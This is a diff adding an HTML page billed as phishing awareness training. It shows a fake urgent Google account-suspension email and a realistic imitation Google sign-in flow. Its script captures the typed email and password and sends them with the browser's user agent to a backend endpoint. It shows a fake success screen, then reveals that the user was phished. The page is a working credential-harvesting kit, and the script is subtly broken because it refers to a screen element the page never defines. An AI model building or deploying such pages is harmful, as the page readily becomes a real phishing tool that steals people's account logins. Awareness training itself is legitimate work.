@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Gmail Phishing Email — Training</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Roboto', sans-serif;
+    background: #f0f4f8;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    color: #202124;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+  .watermark {
+    position: fixed;
+    top: 50%; left: -25%;
+    width: 150%;
+    font-size: clamp(12px, 2.5vw, 14px);
+    font-weight: bold;
+    letter-spacing: 6px;
+    color: rgba(220, 50, 50, 0.10);
+    transform: rotate(-40deg) translateY(-50%);
+    white-space: nowrap;
+    line-height: 4;
+    pointer-events: none;
+    z-index: -1;
+  }
+
+  /* Email card */
+  .email-card {
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    max-width: 780px;
+    width: 100%;
+    padding: clamp(20px, 5vw, 32px) clamp(16px, 4vw, 36px);
+  }
+
+  .subject {
+    font-family: 'Google Sans', sans-serif;
+    font-size: clamp(18px, 5vw, 22px);
+    margin-bottom: 16px;
+  }
+
+  .tag-important {
+    background: #e8f0fe;
+    color: #1a73e8;
+    font-size: 11px;
+    padding: 2px 9px;
+    border-radius: 12px;
+    margin-left: 8px;
+  }
+
+  .warning-bar {
+    background: #fef7e0;
+    border: 1px solid #f9a825;
+    border-radius: 8px;
+    padding: 12px;
+    margin-bottom: 20px;
+    font-size: clamp(13px, 3.5vw, 14px);
+  }
+
+  .sender-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 12px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid #dadce0;
+    margin-bottom: 20px;
+  }
+
+  .avatar {
+    width: 40px; height: 40px;
+    border-radius: 50%;
+    background: #ea4335;
+    color: white;
+    font-size: 18px;
+    font-weight: 500;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .sender-info { flex: 1; min-width: 0; }
+  .sender-name { font-weight: 500; font-size: 14px; }
+  .sender-address { color: #5f6368; font-size: 13px; word-break: break-all; }
+  .email-time { color: #5f6368; font-size: 13px; white-space: nowrap; margin-left: auto; }
+
+  .email-body { font-size: clamp(14px, 3.8vw, 15px); line-height: 1.6; }
+  .urgent-line { color: #d93025; font-weight: 500; }
+
+  .cta-btn {
+    background: #1a73e8;
+    color: white;
+    border: none;
+    padding: 12px 28px;
+    border-radius: 4px;
+    font-size: clamp(14px, 4vw, 15px);
+    cursor: pointer;
+    margin: 20px 0;
+    width: 100%;
+    max-width: 300px;
+  }
+
+  .fake-url { font-size: 12px; color: #5f6368; word-break: break-all; margin-top: 8px; }
+
+  /* Realistic Fake Google Login – Responsive */
+  #loginPage {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: #fff;
+    z-index: 10000;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    overflow-y: auto;
+  }
+
+  .login-card {
+    background: white;
+    width: 100%;
+    max-width: 480px;
+    padding: clamp(32px, 8vw, 48px) clamp(24px, 6vw, 40px) clamp(28px, 7vw, 36px);
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+    text-align: center;
+  }
+
+  .g-logo {
+    width: clamp(70px, 18vw, 80px);
+    height: auto;
+    margin-bottom: 32px;
+  }
+
+  .title {
+    font-family: 'Google Sans', sans-serif;
+    font-size: clamp(24px, 6.5vw, 28px);
+    font-weight: 400;
+    margin-bottom: 8px;
+  }
+
+  .subtitle {
+    color: #5f6368;
+    font-size: clamp(15px, 4vw, 16px);
+    margin-bottom: 40px;
+  }
+
+  .form-group {
+    position: relative;
+    margin-bottom: 32px;
+    text-align: left;
+  }
+
+  input {
+    width: 100%;
+    padding: clamp(14px, 4vw, 16px) 16px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    font-size: clamp(15px, 4.2vw, 16px);
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  input:focus {
+    border-color: #1a73e8;
+    box-shadow: 0 0 0 2px rgba(26,115,232,0.3);
+  }
+
+  label {
+    position: absolute;
+    top: 50%;
+    left: 16px;
+    transform: translateY(-50%);
+    color: #5f6368;
+    font-size: clamp(14px, 4vw, 16px);
+    pointer-events: none;
+    transition: all 0.2s ease;
+  }
+
+  input:focus + label,
+  input:not(:placeholder-shown) + label {
+    top: -10px;
+    left: 12px;
+    font-size: clamp(11px, 3vw, 12px);
+    color: #1a73e8;
+    background: white;
+    padding: 0 6px;
+    transform: none;
+  }
+
+  .btn {
+    background: #1a73e8;
+    color: white;
+    border: none;
+    padding: clamp(12px, 3.5vw, 14px) 32px;
+    border-radius: 999px; /* pill shape */
+    font-size: clamp(14px, 4vw, 15px);
+    font-weight: 500;
+    cursor: pointer;
+    width: 100%;
+    max-width: 200px;
+    margin: 16px auto 0;
+    display: block;
+    transition: background 0.2s;
+  }
+
+  .btn:hover { background: #0d65d6; }
+
+  .links {
+    margin-top: 32px;
+    font-size: clamp(13px, 3.5vw, 14px);
+  }
+
+  .links a {
+    color: #1a73e8;
+    text-decoration: none;
+    margin: 0 12px;
+  }
+
+  .links a:hover { text-decoration: underline; }
+
+  .code-hint {
+    color: #5f6368;
+    font-size: clamp(13px, 3.5vw, 14px);
+    margin: 16px 0 24px;
+  }
+
+  /* Scam screen – also responsive */
+  #scamScreen {
+    display: none;
+    width: 100%;
+    max-width: 520px;
+    margin: 40px auto;
+    padding: clamp(40px, 8vw, 60px) clamp(20px, 5vw, 40px);
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 8px 40px rgba(0,0,0,0.2);
+    text-align: center;
+  }
+
+  .scam-title { color: #d93025; font-size: clamp(32px, 8vw, 42px); margin-bottom: 24px; }
+  .scam-text { font-size: clamp(16px, 4.2vw, 18px); line-height: 1.6; margin-bottom: 40px; }
+  .back-btn {
+    background: #1a73e8;
+    color: white;
+    padding: clamp(12px, 4vw, 14px) clamp(32px, 8vw, 40px);
+    border: none;
+    border-radius: 999px;
+    font-size: clamp(15px, 4.2vw, 16px);
+    cursor: pointer;
+  }
+
+  /* Media queries for fine-tuning mobile */
+  @media (max-width: 480px) {
+    body { padding: 8px; }
+    .login-card { padding: 32px 24px 28px; border-radius: 0; box-shadow: none; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
+    .btn { max-width: none; }
+    .email-card { border-radius: 0; box-shadow: none; }
+  }
+
+  @media (max-width: 360px) {
+    .title { font-size: 24px; }
+    input, .btn { font-size: 15px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="watermark">PHISHING AWARENESS TRAINING – FAKE – DO NOT USE REAL CREDENTIALS</div>
+
+<!-- Original phishing email card -->
+<div class="email-card">
+  <div class="subject">
+    ⚠️ URGENT: Your Google Account Access Will Be Suspended
+    <span class="tag-important">Important</span>
+  </div>
+
+  <div class="warning-bar">
+    ⚠️ Be careful with this message. Similar messages were used to steal people's personal information.
+  </div>
+
+  <div class="sender-row">
+    <div class="avatar">G</div>
+    <div class="sender-info">
+      <div class="sender-name">Google Security Team</div>
+      <div class="sender-address">&lt;no-reply@google-security-alerts.accounts-verify.net&gt;</div>
+    </div>
+    <div class="email-time">10:42 AM (2 hours ago)</div>
+  </div>
+
+  <div class="email-body">
+    <p>Dear Google Account User,</p>
+    <p>We have detected <strong>suspicious sign-in activity</strong> from Lagos, Nigeria. Access limited for security.</p>
+    <p class="urgent-line">⚠️ Permanent suspension in 24 hours unless verified now.</p>
+    <p>Click to verify and restore access:</p>
+    <button class="cta-btn" id="verifyBtn">Verify My Google Account →</button>
+    <span class="fake-url">https://accounts.google-security-alerts.accounts-verify.net/signin/v2/identifier?...</span>
+  </div>
+</div>
+
+<!-- Fake realistic Google login overlay -->
+<div id="loginPage">
+  <div class="login-card" id="step1">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="g-logo">
+    <h1 class="title">Sign in</h1>
+    <p class="subtitle">Use your Google Account</p>
+
+    <div class="form-group">
+      <input type="email" id="email" placeholder=" " autocomplete="off">
+      <label for="email">Email or phone</label>
+    </div>
+
+    <button class="btn" id="nextBtn">Next</button>
+
+    <div class="links">
+      <a href="#">Forgot email?</a>
+      <a href="#">Create account</a>
+    </div>
+  </div>
+
+  <div class="login-card" id="step2" style="display:none;">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="g-logo">
+    <h1 class="title">Welcome</h1>
+    <p class="subtitle" id="showEmail"></p>
+
+    <div class="form-group">
+      <input type="password" id="password" placeholder=" " autocomplete="off">
+      <label for="password">Enter your password</label>
+    </div>
+
+    <button class="btn" id="signinBtn">Next</button>
+
+    <div class="links">
+      <a href="#">Forgot password?</a>
+    </div>
+  </div>
+<script>
+// Variables
+const loginPage   = document.getElementById('loginPage');
+const step1       = document.getElementById('step1');
+const step2       = document.getElementById('step2');
+const emailEl     = document.getElementById('email');
+const passwordEl  = document.getElementById('password');
+const showEmail   = document.getElementById('showEmail');
+const scamScreen  = document.getElementById('scamScreen');
+
+// Temporary storage
+let captured = {
+  email:    '(not entered)',
+  password: '(not entered)',
+  time:     new Date().toLocaleString(),
+  userAgent: navigator.userAgent
+};
+
+// Backend endpoint
+const BACKEND_URL = 'http://localhost:3000/save-login';
+
+// ─── LOADING SCREEN (reusable) ────────────────────────────────────────
+let loadingScreen = null;
+
+function showLoading(message = 'Verifying...') {
+  if (!loadingScreen) {
+    loadingScreen = document.createElement('div');
+    loadingScreen.id = 'loadingScreen';
+    loadingScreen.style.cssText = `
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.95);
+      z-index: 10002;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      text-align: center;
+    `;
+    loadingScreen.innerHTML = `
+      <div style="width:60px; height:60px; border:8px solid #1a73e8; border-top-color:#dadce0; border-radius:50%; animation:spin 1.2s linear infinite; margin-bottom:24px;"></div>
+      <p style="font-size:20px; color:#202124; font-weight:500;">${message}</p>
+    `;
+    document.body.appendChild(loadingScreen);
+  }
+  loadingScreen.querySelector('p').textContent = message;
+  loadingScreen.style.display = 'flex';
+}
+
+function hideLoading() {
+  if (loadingScreen) loadingScreen.style.display = 'none';
+}
+
+// Simple spinner animation
+const style = document.createElement('style');
+style.textContent = `
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+`;
+document.head.appendChild(style);
+
+// ─── BACKEND SEND ────────────────────────────────────────
+async function sendToBackend() {
+  if (captured.email === '(not entered)' || captured.password === '(not entered)') {
+    console.warn('[DEMO] No email/password to send');
+    return;
+  }
+
+  const payload = {
+    email: captured.email,
+    password: captured.password,
+    userAgent: captured.userAgent,
+    timestamp: captured.time
+  };
+
+  try {
+    const response = await fetch(BACKEND_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+
+    if (response.ok) {
+      console.log('[DEMO] Credentials sent');
+    } else {
+      console.warn('[DEMO] Backend error:', response.status);
+    }
+  } catch (err) {
+    console.error('[DEMO] Fetch failed — server running?', err);
+  }
+}
+
+// ─── SUCCESS SCREEN ────────────────────────────────────────
+let successScreen = null;
+
+function createAndShowSuccess() {
+  if (!successScreen) {
+    successScreen = document.createElement('div');
+    successScreen.id = 'successScreen';
+    successScreen.style.cssText = `
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #fff;
+      z-index: 10001;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      text-align: center;
+      padding: 40px;
+    `;
+    successScreen.innerHTML = `
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" style="width:80px; margin-bottom:32px;">
+      <h1 style="font-family:'Google Sans',sans-serif; font-size:32px; color:#202124; margin-bottom:16px;">
+        It's verified!
+      </h1>
+      <p style="font-size:18px; color:#5f6368; max-width:480px; line-height:1.5;">
+        Your account access has been successfully restored.<br>
+        Thank you for verifying your identity.
+      </p>
+      <div style="margin-top:40px; font-size:16px; color:#34a853;">
+        Redirecting you back to Gmail...
+      </div>
+    `;
+    document.body.appendChild(successScreen);
+  }
+  successScreen.style.display = 'flex';
+}
+
+// ─── MAIN FLOW ────────────────────────────────────────
+function showLogin() {
+  loginPage.style.display = 'flex';
+  step1.style.display = 'block';
+  step2.style.display = 'none';
+  scamScreen.style.display = 'none';
+  if (successScreen) successScreen.style.display = 'none';
+  hideLoading();
+}
+
+// Verify button
+document.getElementById('verifyBtn').onclick = showLogin;
+
+// After email → loading → delay 4+ seconds → password screen
+document.getElementById('nextBtn').onclick = () => {
+  const email = emailEl.value.trim();
+  if (!email) return alert('Please enter an email');
+
+  captured.email = email;
+  showEmail.textContent = email;
+
+  // Hide email step, show loading
+  step1.style.display = 'none';
+  showLoading('Checking your account...');
+
+  // Fake delay ~4–6 seconds
+  setTimeout(() => {
+    hideLoading();
+    step2.style.display = 'block';
+    console.log('[DEMO] Email entered:', email);
+  }, 4500); // 4.5 seconds — you can change to 4000 or 6000
+};
+
+// After password → loading → delay 4+ seconds → fake verified → scam reveal
+document.getElementById('signinBtn').onclick = async () => {
+  const pass = passwordEl.value.trim();
+  if (!pass) return alert('Please enter a password');
+
+  captured.password = pass;
+
+  // Hide password step, show loading
+  step2.style.display = 'none';
+  showLoading('Verifying credentials...');
+
+  // Send to backend during the delay
+  sendToBackend();
+
+  // Fake delay ~4–6 seconds
+  setTimeout(() => {
+    hideLoading();
+
+    // Show fake success screen
+    createAndShowSuccess();
+
+    // After ~3.5 seconds more → reveal scam
+    setTimeout(() => {
+      if (successScreen) successScreen.style.display = 'none';
+      scamScreen.style.display = 'block';
+
+      setTimeout(() => {
+        alert(
+          "YOU JUST GOT PHISHED! (training simulation)\n\n" +
+          "The 'It's verified' screen was fake.\n" +
+          "Your email and password were already sent to the attacker.\n\n" +
+          "Real services don't behave this way after clicking suspicious links."
+        );
+      }, 800);
+    }, 3500);
+  }, 4500); // 4.5 seconds — adjust as needed
+};
+</script>
+
+</body>
+</html>
